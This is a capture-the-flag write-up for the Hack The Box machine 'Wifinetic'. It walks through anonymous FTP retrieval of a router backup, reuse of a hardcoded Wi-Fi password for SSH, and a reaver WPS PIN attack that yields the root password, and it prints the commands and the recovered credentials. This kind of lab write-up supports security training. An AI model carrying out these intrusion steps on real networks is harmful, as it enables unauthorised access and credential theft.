# HTB Wifinetic — Writeup

**Machine:** Wifinetic  
**Target IP:** `<IP>`  
**OS:** Linux (Ubuntu 20.04)  
**Difficulty:** Easy

---

## Table of Contents

1. Reconnaissance
2. Enumeration
3. Initial Access
4. Privilege Escalation
5. Flags

---

## 1. Reconnaissance

We start with a standard Nmap scan to identify open ports and running services.

```bash
nmap -sCV <IP>
```

### Results

| Port | Service | Findings |
|---|---|---|
| `21/tcp` | FTP | vsftpd 3.0.3 — anonymous login allowed |
| `22/tcp` | SSH | OpenSSH 8.2p1 |
| `53/tcp` | DNS | tcpwrapped |

---

## 2. Enumeration

### FTP — Port 21

Nmap reveals that anonymous FTP login is allowed. We connect and list the available files:

```bash
ftp <IP>
# Login: anonymous
# Password: (press Enter)

ftp> ls
```

Among the files, we find an OpenWrt router backup:

```text
backup-OpenWrt-2023-07-26.tar
```

We download the available files for analysis:

```bash
wget -m ftp://anonymous:anonymous@<IP>/
```

### Extracting the Backup

After downloading the files, we extract the archive:

```bash
tar -xvf backup-OpenWrt-2023-07-26.tar
```

Looking through the extracted files, we focus on the network and user configurations:

- `etc/passwd` — reveals a custom user named `netadmin`.
- `etc/config/wireless` — contains the Wi-Fi configuration.

Read the wireless configuration:

```bash
cat etc/config/wireless
```

The configuration contains a hardcoded Wi-Fi password:

```text
config wifi-iface 'wifinet0'
    option device 'radio0'
    option mode 'ap'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key 'VeRyUniUqWiFIPasswrd1!'
    ...
```

---

## 3. Initial Access

Since password reuse is common in such environments, we try the recovered Wi-Fi password for the `netadmin` account over SSH.

```bash
ssh netadmin@<IP>
# Password: VeRyUniUqWiFIPasswrd1!
```

We successfully obtain a foothold and can retrieve the user flag:

```bash
cat /home/netadmin/user.txt
```

---

## 4. Privilege Escalation

To look for a path to root, we download and run `linpeas.sh`, a privilege-escalation enumeration script.

The hostname is `wifinetic`, and the presence of multiple wireless interfaces stands out:

```text
wlan0
wlan1
mon0
```

The most important finding appears in the **Capabilities** section:

```text
/usr/bin/reaver = cap_net_raw+ep
```

`reaver` is a tool used to test Wi-Fi Protected Setup (WPS). The `cap_net_raw` capability allows a regular user to use raw network sockets without requiring full root privileges.

### WPS Configuration Finding

The network interfaces show that `mon0` is already in monitor mode. The access point's MAC address, observed on `wlan0`, is:

```text
02:00:00:00:00:00
```

The original writeup uses `reaver` against the access point:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

The reported result is:

```text
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
```

**Note:** The reported speed is attributed to a misconfigured script, `/usr/local/bin/wps_check.sh`, running as root and forcing the WPS PIN to `12345670`.

### Gaining Root

The recovered password is then used to switch to the root account:

```bash
su root
# Password: WhatIsRealAnDWhAtIsNot51121!
```

Authentication succeeds, granting root access. The root flag can then be read


---

## 5. Flags

| Flag | Path |
|---|---|
| User | `/home/netadmin/user.txt` |
| Root | `/root/root.txt` |

 

---

## Attack Chain Summary

```text
Nmap scan
    → Anonymous FTP access
    → Download OpenWrt backup
    → Recover Wi-Fi password
    → Password reuse
    → SSH as netadmin
    → Enumerate capabilities
    → Identify reaver with cap_net_raw
    → Recover WPS credentials
    → su root
    → Read root flag
```
